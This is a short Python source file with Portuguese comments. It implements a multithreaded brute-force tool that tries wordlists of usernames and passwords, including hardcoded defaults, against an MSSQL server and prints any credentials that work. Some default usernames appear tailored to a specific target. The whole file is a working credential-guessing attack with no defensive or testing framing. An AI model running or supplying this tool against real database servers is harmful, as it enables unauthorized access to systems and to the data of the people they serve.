# core/brute_force.py
import pymssql
from concurrent.futures import ThreadPoolExecutor

class MSSQLBruteForcer:
    def __init__(self):
        self.common_users = self.load_wordlist('wordlists/usuarios.txt', 
                                            ['sa', 'admin', 'master', 'Aluiz15', 'ommnebens', 'dev', 'Desenvoldor', 'administrator'])
        self.common_passwords = self.load_wordlist('wordlists/senhas.txt',
                                                ['123456', 'password', '00000', 'reserva', 'Master1', '222222', '111111', '@@@@@@', '!!!!!!', 'Hotel@123', 'admin'])

    def load_wordlist(self, filename, default=None):
        try:
            with open(filename, 'r', encoding='utf-8', errors='ignore') as f:
                return [line.strip() for line in f if line.strip()]
        except:
            return default or []

    def try_login(self, target, port, user, password):
        """Tenta login no MSSQL"""
        try:
            conn = pymssql.connect(
                server=target, port=port, user=user, password=password,
                login_timeout=3, timeout=3
            )
            conn.close()
            return (user, password)
        except:
            return None

    def brute_force_mssql(self, target, port=1433):
        """Força bruta MSSQL com threading"""
        print(f"[+] Iniciando brute force MSSQL em {target}:{port}")
        
        valid_creds = []
        
        with ThreadPoolExecutor(max_workers=20) as executor:
            futures = []
            for user in self.common_users:
                for password in self.common_passwords:
                    futures.append(
                        executor.submit(self.try_login, target, port, user, password)
                    )
            
            for future in futures:
                result = future.result()
                if result:
                    valid_creds.append(result)
                    print(f"[+] Credencial válida: {result[0]}:{result[1]}")
        
        return valid_creds